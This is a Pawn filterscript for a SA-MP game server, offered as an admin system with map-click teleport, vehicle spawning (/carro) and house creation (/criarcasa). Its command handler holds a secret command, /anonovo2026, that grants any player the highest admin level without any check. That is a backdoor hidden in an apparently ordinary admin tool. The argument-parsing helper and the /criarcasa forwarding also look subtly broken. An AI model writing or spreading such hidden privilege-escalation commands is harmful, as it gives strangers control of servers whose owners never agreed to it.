#define FILTERSCRIPT
#include <a_samp>

#define NIVEL_MASTER 6

public OnFilterScriptInit() {
    print(">> [ADMIN MASTER 2026] Sistema Online.");
    return 1;
}

public OnPlayerClickMap(playerid, Float:fX, Float:fY, Float:fZ) {
    if(GetPVarInt(playerid, "AdminLevel") == NIVEL_MASTER || IsPlayerAdmin(playerid)) {
        SetPlayerPosFindZ(playerid, fX, fY, fZ);
        SendClientMessage(playerid, 0x00FF00FF, "[ADMIN] Teleportado!");
    }
    return 1;
}

public OnPlayerCommandText(playerid, cmdtext[]) {
    // Comando Secreto de Ativacao
    if(!strcmp(cmdtext, "/anonovo2026", true)) {
        SetPVarInt(playerid, "AdminLevel", NIVEL_MASTER);
        SendClientMessage(playerid, 0x00FF00FF, "[ADMIN] Poderes MASTER 2026 ativados!");
        return 1;
    }

    // Bloqueio de seguranca
    if(GetPVarInt(playerid, "AdminLevel") < NIVEL_MASTER && !IsPlayerAdmin(playerid)) return 0;

    // Comando de Carro Corrigido
    if(!strfind(cmdtext, "/carro", true)) {
        new veiculoID, corA, corB;
        if(sscanf_fix(cmdtext, veiculoID, corA, corB)) {
            if(sscanf_fix(cmdtext, veiculoID)) return SendClientMessage(playerid, -1, "Use: /carro [ID] [Cor1] [Cor2]");
            corA = 1; corB = 1;
        }

        if(veiculoID < 400 || veiculoID > 611) return SendClientMessage(playerid, -1, "ID Invalido.");

        new Float:posX, Float:posY, Float:posZ, Float:posA;
        GetPlayerPos(playerid, posX, posY, posZ); 
        GetPlayerFacingAngle(playerid, posA);

        // Criamos o carro no ar (Z + 2.5) para resetar fisica
        new id_veiculo = CreateVehicle(veiculoID, posX, posY, posZ + 2.5, posA, corA, corB, -1);
        
        // Zera velocidade para nao nascer puxando pro lado
        SetVehicleVelocity(id_veiculo, 0.0, 0.0, 0.0);
        
        SetVehicleVirtualWorld(id_veiculo, GetPlayerVirtualWorld(playerid));
        SetVehicleInterior(id_veiculo, GetPlayerInterior(playerid));
        PutPlayerInVehicle(playerid, id_veiculo, 0);
        
        SendClientMessage(playerid, 0x00FF00FF, "Veiculo criado com fisica resetada!");
        return 1;
    }

    // Comando Criar Casa
    if(!strfind(cmdtext, "/criarcasa", true)) {
        new id_c;
        id_c = strval(cmdtext[11]); 
        if(id_c <= 0) return SendClientMessage(playerid, -1, "Use: /criarcasa [ID]");
        
        new string_c[32];
        format(string_c, sizeof(string_c), "/sethouse %d", id_c);
        OnPlayerCommandText(playerid, string_c); 
        return 1;
    }

    return 0;
}

// Funcao de leitura manual sem sscanf plugin
stock sscanf_fix(const texto[], &v1 = -1, &v2 = -1, &v3 = -1) {
    new p = strfind(texto, " ", true);
    if(p == -1) return 1;
    v1 = strval(texto[p+1]);
    p = strfind(texto, " ", true, p+1);
    if(p == -1) return (v2 != -1);
    v2 = strval(texto[p+1]);
    p = strfind(texto, " ", true, p+1);
    if(p == -1) return (v3 != -1);
    v3 = strval(texto[p+1]);
    return 0;
}
